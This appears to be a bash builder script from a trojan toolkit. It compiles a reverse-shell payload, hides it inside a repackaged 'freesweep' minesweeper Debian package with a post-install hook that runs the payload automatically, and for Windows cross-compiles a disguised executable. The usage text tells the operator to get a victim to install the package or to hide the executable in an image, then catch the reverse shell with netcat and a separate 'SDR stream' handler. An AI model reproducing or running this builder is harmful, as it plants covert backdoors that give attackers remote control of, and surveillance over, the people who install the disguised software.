#! /bin/bash
clear

echo "████████ ██████   ██████       ██  █████  ███    ██ "
echo "   ██    ██   ██ ██    ██      ██ ██   ██ ████   ██ "
echo "   ██    ██████  ██    ██      ██ ███████ ██ ██  ██ "
echo "   ██    ██   ██ ██    ██ ██   ██ ██   ██ ██  ██ ██ "
echo "   ██    ██   ██  ██████   █████  ██   ██ ██   ████ "
echo
echo "Author: Gallifrey"
echo

payloads_path=$(dirname "$0")/trojan_files

yellow='\033[1;33m'
green='\033[1;32m'
blue='\033[0;34m'
red='\033[0;31m'
cyan='\033[1;36m'
dgreen='\033[0;32m'
nc='\033[0m'

echo -e "${yellow}==================== CONFIGURE PAYLOAD ====================${nc}"
read -p "TARGET OS (linux/windows): " target_os
read -p "IP ADDRESS OF ATTACKER (SHELL): " rev_attacker_ip
read -p "PORT TO GET REVERSE SHELL: " rev_port
read -p "PORT TO GET SDR COMM: " sdr_port
echo -e "${yellow}===========================================================${nc}"
echo

if [ -z "$target_os" ]
then
	target_os=linux
fi

if [ -z "$rev_attacker_ip" ]
then
	rev_attacker_ip='192.168.0.1'
fi

if [ -z "$rev_port" ]
then
	rev_port=9999
fi

if [ -z "$sdr_port" ]
then
	sdr_port=4444
fi

echo
echo -e "${yellow}========================= DETAILS =========================${nc}"
echo -e "SHELL ATTACKER IP: ${blue}$rev_attacker_ip${nc}"
echo -e "REV SHELL PORT: ${blue}$rev_port${nc}"
echo -e "SDR COMM PORT: ${blue}$sdr_port${nc}"

if [ "$target_os" == "linux" ]
then
  cover=freesweep
  echo -e "PACKAGE: ${blue}$cover${nc}"
fi

echo -e "TARGET OS: ${blue}$target_os${nc}"
echo -e "${yellow}===========================================================${nc}"
echo
echo -e "${dgreen}[*] Creating exploit...${nc}"

if [ "$target_os" == "linux" ]
then
  $(python3 ./trojan_files/create_exploit.py -i $rev_attacker_ip -p $rev_port -P $sdr_port -o $payloads_path -t $target_os)

  	echo -e "${dgreen}[*] Compiling exploit...${nc}"

  	p1=$payloads_path/virus.cpp
  	p2=$payloads_path/exploit_help.cpp
  	$(g++ -o $payloads_path/exp $p1 $p2)

  	echo -e "${dgreen}[*] Done Compiling...${nc}"
  	echo -e "${dgreen}[*] Creating trojan${nc}"
  	echo -e "${dgreen}[*] Downloading files...${nc}"

  	apt-get --download-only install $cover -y

  	echo -e "${dgreen}[*] Done downloading.${nc}"
  	echo -e "${dgreen}[*] Hiding payload...${nc}"

  	deb_name=$(ls /var/cache/apt/archives | grep $cover)
  	$(mkdir deb_files)
  	$(mkdir deb_files/work)
  	$(mv /var/cache/apt/archives/$deb_name deb_files)
  	$(dpkg -x deb_files/$deb_name deb_files/work)
  	$(mkdir deb_files/work/DEBIAN)
  	$(echo "Package: $cover
Version: ${deb_name:10:7}
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use." > deb_files/work/DEBIAN/control)
  	$(echo "#\!/bin/sh
  	sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores && rm /usr/games/freesweep_scores" > deb_files/work/DEBIAN/postinst)
  	$(mv $payloads_path/exp deb_files/work/usr/games/freesweep_scores)
  	$(chmod 755 deb_files/work/DEBIAN/postinst)
  	dpkg-deb --build deb_files/work
  	$(mv deb_files/work.deb $cover.deb)

  	echo -e "${dgreen}[*] trojan generated: $cover.deb${nc}"
  	echo -e "${dgreen}[*] Cleaning up...${nc}"

  	$(rm -rf deb_files GENERATED_EXPLOIT)
    $(mkdir GENERATED_EXPLOIT)
    $(mv ./freesweep.deb GENERATED_EXPLOIT/freesweep.deb)

    echo -e "${green}[*] Done!${nc}"
    echo
  	echo -e "${yellow}========================== USAGE =========================${nc}"
  	echo -e "Get your victim to install the generated trojan"
  	echo -e "Reverse Shell: ${cyan}nc -lvp $rev_port${nc}"
  	echo -e "SDR stream: ${cyan}python3 handlers/linux_sdr.py -p ${sdr_port}${nc}"
  	echo -e "${yellow}===========================================================${nc}"

else

  $(python3 ./trojan_files/create_exploit.py -i $rev_attacker_ip -o $payloads_path -t $target_os)

		echo -e "${dgreen}[*] Compiling exploit...${nc}"

	p1=$payloads_path/virus.cpp
	p2=$payloads_path/exploit_help.cpp
	$(x86_64-w64-mingw32-g++ $p1 $p2 -Wall -c -g)
 	$(x86_64-w64-mingw32-g++ -static -static-libgcc -static-libstdc++ -o util.exe virus.o exploit_help.o)
  $(pyinstaller --onefile $payloads_path/win.py)

	echo -e "${dgreen}[*] Done Compiling...${nc}"
	echo -e "${dgreen}[*] Cleaning up...${nc}"

	$(rm *.o)
  $(rm -rf GENERATED_EXPLOIT)
  $(mkdir GENERATED_EXPLOIT)
  $(mv ./util.exe GENERATED_EXPLOIT/util.exe)
  $(cp dist/win ./GENERATED_EXPLOIT/util2.exe)
  $(rm -rf dist build win.spec)

  echo -e "${green}[*] Done!${nc}"
	echo
	echo -e "${yellow}========================== USAGE =========================${nc}"
	echo -e "Executable is ready, hide it in an image or something."
	echo -e "Then get your victim to execute it."
  echo -e "Reverse Shell: ${cyan}python3 handlers/server.py${nc}"
	echo -e "SDR stream: ${cyan}python3 handlers/win_sdr.py -p ${sdr_port}${nc}"
	echo -e "${yellow}===========================================================${nc}"

fi
